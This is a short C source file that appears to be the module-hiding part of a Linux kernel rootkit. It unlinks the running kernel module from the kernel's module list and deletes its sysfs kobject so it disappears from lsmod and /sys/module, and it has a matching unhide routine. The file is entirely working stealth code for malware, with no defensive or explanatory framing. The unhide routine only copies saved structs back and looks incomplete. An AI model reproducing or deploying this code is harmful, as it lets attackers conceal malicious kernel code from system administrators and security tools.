#include <module_hide.h>

void hide_module(int *module_is_hidden) {

	if (*module_is_hidden) {
		return;
	}

	/* save states of structs */
	memcpy(&list_head_saved, &THIS_MODULE->list, sizeof(struct list_head));
	memcpy(&mkobj_saved, &THIS_MODULE->mkobj, sizeof(struct module_kobject));

	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	*module_is_hidden = 1;
}

void unhide_module(int *module_is_hidden) {

	if (!(*module_is_hidden)) {
		return;
	}
	/* restore states of structs */
	memcpy(&THIS_MODULE->list, &list_head_saved, sizeof(struct list_head));
	memcpy(&THIS_MODULE->mkobj, &mkobj_saved, sizeof(struct module_kobject));
	*module_is_hidden = 0;	
}